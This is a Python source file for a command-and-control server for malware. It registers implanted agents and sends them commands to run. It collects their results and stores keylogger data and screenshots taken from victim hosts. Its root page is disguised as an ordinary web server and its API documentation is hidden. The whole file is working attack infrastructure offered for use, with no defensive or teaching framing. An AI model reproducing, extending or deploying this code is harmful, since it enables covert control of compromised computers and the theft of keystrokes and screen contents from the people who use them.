"""
C2 Server - Command and Control Infrastructure
Multi-protocol support with encryption and stealth capabilities
"""

import asyncio
import os
import json
import uuid
from typing import Dict, List, Optional
from datetime import datetime
import logging
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import JSONResponse
import uvicorn

logger = logging.getLogger(__name__)


class C2Server:
    """
    Command and Control Server
    
    Features:
    - Multi-protocol support (HTTP/HTTPS, DNS, WebSocket, ICMP)
    - AES-256 encryption
    - Agent registration and management
    - Task queue system
    - File transfer
    - Result collection
    - Heartbeat monitoring
    """
    
    def __init__(self, host: str = "0.0.0.0", port: int = 8000):
        self.host = host
        self.port = port
        self.app = FastAPI(title="C2 Server", docs_url=None, redoc_url=None)
        
        # Agent management
        self.agents: Dict[str, Dict] = {}
        self.task_queues: Dict[str, asyncio.Queue] = {}
        self.results: Dict[str, List] = {}
        
        # Encryption key
        self.encryption_key = os.getenv('C2_KEY', self._generate_key())
        
        # Setup routes
        self._setup_routes()
        
        logger.info(f"[C2Server] Initialized on {host}:{port}")
    
    def _setup_routes(self):
        """Setup FastAPI routes"""
        
        @self.app.get("/")
        async def root():
            """Root endpoint - looks like normal web server"""
            return {"message": "Welcome"}
        
        @self.app.post("/register")
        async def register_agent(request: Request):
            """Register new agent"""
            data = await request.json()
            
            agent_id = str(uuid.uuid4())
            self.agents[agent_id] = {
                "id": agent_id,
                "hostname": data.get("hostname"),
                "os": data.get("os"),
                "ip": data.get("ip"),
                "registered_at": datetime.now().isoformat(),
                "last_seen": datetime.now().isoformat(),
                "status": "active"
            }
            
            # Create task queue for agent
            self.task_queues[agent_id] = asyncio.Queue()
            self.results[agent_id] = []
            
            logger.info(f"[C2Server] Agent registered: {agent_id}")
            
            return {"agent_id": agent_id, "key": self.encryption_key}
        
        @self.app.get("/beacon/{agent_id}")
        async def beacon(agent_id: str):
            """Agent beacon - check for tasks"""
            
            if agent_id not in self.agents:
                raise HTTPException(status_code=404, detail="Agent not found")
            
            # Update last seen
            self.agents[agent_id]["last_seen"] = datetime.now().isoformat()
            
            # Get pending task
            try:
                task = await asyncio.wait_for(
                    self.task_queues[agent_id].get(),
                    timeout=1.0
                )
                
                return {"task": task}
            except asyncio.TimeoutError:
                return {"task": None}
        
        @self.app.post("/result/{agent_id}")
        async def submit_result(agent_id: str, request: Request):
            """Agent submits task result"""
            
            if agent_id not in self.agents:
                raise HTTPException(status_code=404, detail="Agent not found")
            
            data = await request.json()
            
            result = {
                "timestamp": datetime.now().isoformat(),
                "task_id": data.get("task_id"),
                "success": data.get("success"),
                "data": data.get("data")
            }
            
            self.results[agent_id].append(result)
            
            logger.info(f"[C2Server] Result received from {agent_id}")
            
            return {"status": "ok"}
        
        @self.app.post("/keylog")
        async def receive_keylog(request: Request):
            """Receive keylogger data"""
            data = await request.json()
            
            # Store keylog data
            hostname = data.get("hostname")
            keylog_data = data.get("data")
            
            logger.info(f"[C2Server] Keylog received from {hostname}")
            
            # Save to file
            os.makedirs("/tmp/c2_data/keylogs", exist_ok=True)
            filename = f"/tmp/c2_data/keylogs/{hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            
            with open(filename, 'w') as f:
                f.write(keylog_data)
            
            return {"status": "ok"}
        
        @self.app.post("/screenshot")
        async def receive_screenshot(request: Request):
            """Receive screenshot data"""
            data = await request.json()
            
            hostname = data.get("hostname")
            filename = data.get("filename")
            image_data = data.get("data")
            
            logger.info(f"[C2Server] Screenshot received from {hostname}")
            
            # Save screenshot
            os.makedirs("/tmp/c2_data/screenshots", exist_ok=True)
            filepath = f"/tmp/c2_data/screenshots/{hostname}_{filename}"
            
            import base64
            with open(filepath, 'wb') as f:
                f.write(base64.b64decode(image_data))
            
            return {"status": "ok"}
        
        @self.app.get("/agents")
        async def list_agents():
            """List all registered agents"""
            return {"agents": list(self.agents.values())}
        
        @self.app.get("/agent/{agent_id}")
        async def get_agent(agent_id: str):
            """Get agent details"""
            
            if agent_id not in self.agents:
                raise HTTPException(status_code=404, detail="Agent not found")
            
            return {
                "agent": self.agents[agent_id],
                "results": self.results.get(agent_id, [])
            }
        
        @self.app.post("/task/{agent_id}")
        async def assign_task(agent_id: str, request: Request):
            """Assign task to agent"""
            
            if agent_id not in self.agents:
                raise HTTPException(status_code=404, detail="Agent not found")
            
            data = await request.json()
            
            task = {
                "task_id": str(uuid.uuid4()),
                "command": data.get("command"),
                "args": data.get("args", {}),
                "created_at": datetime.now().isoformat()
            }
            
            await self.task_queues[agent_id].put(task)
            
            logger.info(f"[C2Server] Task assigned to {agent_id}: {task['command']}")
            
            return {"status": "ok", "task_id": task["task_id"]}
    
    async def start(self):
        """Start C2 server"""
        
        logger.info(f"[C2Server] Starting on {self.host}:{self.port}")
        
        config = uvicorn.Config(
            self.app,
            host=self.host,
            port=self.port,
            log_level="info"
        )
        
        server = uvicorn.Server(config)
        await server.serve()
    
    def _generate_key(self) -> str:
        """Generate encryption key"""
        try:
            from cryptography.fernet import Fernet
            return Fernet.generate_key().decode()
        except:
            import secrets
            return secrets.token_urlsafe(32)
    
    async def monitor_agents(self):
        """Monitor agent health"""
        
        while True:
            await asyncio.sleep(60)  # Check every minute
            
            current_time = datetime.now()
            
            for agent_id, agent in self.agents.items():
                last_seen = datetime.fromisoformat(agent["last_seen"])
                delta = (current_time - last_seen).total_seconds()
                
                if delta > 300:  # 5 minutes
                    agent["status"] = "inactive"
                    logger.warning(f"[C2Server] Agent {agent_id} is inactive")
                else:
                    agent["status"] = "active"


# Standalone execution
if __name__ == "__main__":
    async def main():
        server = C2Server(host="0.0.0.0", port=8000)
        
        # Start agent monitor
        asyncio.create_task(server.monitor_agents())
        
        # Start server
        await server.start()
    
    asyncio.run(main())

